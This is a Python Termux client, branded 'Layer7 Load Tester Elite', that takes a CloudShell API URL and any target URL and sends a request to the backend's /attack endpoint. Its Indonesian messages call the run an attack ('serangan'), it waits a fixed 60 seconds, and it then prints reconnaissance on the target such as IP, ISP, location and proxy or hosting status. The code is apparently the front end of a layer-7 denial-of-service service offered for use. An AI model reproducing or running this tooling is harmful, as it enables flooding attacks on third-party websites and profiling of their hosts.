import os
import time
import requests
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.box import ROUNDED

console = Console()

def clear():
    os.system('clear')

def show_logo():
    logo = Text("""
  ████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗
  ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝
     ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝ 
     ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗ 
     ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗
     ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝
    """, style="bold magenta")
    console.print(logo)
    console.print(Panel("Layer7 Load Tester Elite - Termux Client", 
                       style="bold yellow", box=ROUNDED))

def get_info(api_url, target):
    try:
        with console.status("[bold green]Memulai serangan...", spinner="dots"):
            response = requests.post(
                f"{api_url}/attack", 
                json={"target": target, "apiKey": "TERMUX_KEY"},
                timeout=15
            )
        return response.json()
    except Exception as e:
        console.print(f"[red]Error: {str(e)}")
        return None

def display_result(target, result):
    table = Table(show_header=True, header_style="bold magenta", box=ROUNDED)
    table.add_column("Info", style="cyan", width=20)
    table.add_column("Detail", style="yellow")
    
    table.add_row("Target", target)
    table.add_row("IP Address", result['info']['ip'])
    table.add_row("ISP", result['info']['isp'])
    table.add_row("Organization", result['info']['org'])
    table.add_row("AS Number", result['info']['as'])
    table.add_row("Location", f"{result['info']['city']}, {result['info']['region']}")
    table.add_row("Country", result['info']['country'])
    table.add_row("Timezone", result['info']['timezone'])
    table.add_row("Reverse DNS", result['info']['reverse'])
    table.add_row("Mobile", "Yes" if result['info']['mobile'] else "No")
    table.add_row("Proxy/VPN", "Yes" if result['info']['proxy'] else "No")
    table.add_row("Hosting", "Yes" if result['info']['hosting'] else "No")
    table.add_row("Timestamp", result['info']['timestamp'])
    table.add_row("Duration", "60 detik")
    
    console.print(Panel.fit(table, title="[bold green]Hasil Serangan", 
                          subtitle="[yellow]=== SUKSES ==="))

def main():
    clear()
    show_logo()
    
    api_url = console.input("[bold cyan]MASUKAN API DARI CLOUDSHELL: [/]").strip()
    
    clear()
    show_logo()
    console.print(f"[green][INFO][/] Terhubung ke CloudShell: [yellow]{api_url}")
    time.sleep(2)
    
    clear()
    show_logo()
    target = console.input("[bold cyan]MASUKAN TARGET URL: [/]").strip()
    
    clear()
    show_logo()
    console.print(Panel.fit("MEMULAI SERANGAN!\nDurasi tetap 60 detik", 
                          style="bold red"))
    
    result = get_info(api_url, target)
    if not result or 'error' in result:
        console.print("[red]Gagal memulai serangan![/]")
        return
    
    with console.status("[bold red]Serangan sedang berlangsung...", 
                       spinner="bouncingBar"):
        time.sleep(60)
    
    clear()
    show_logo()
    display_result(target, result)

if __name__ == "__main__":
    main()
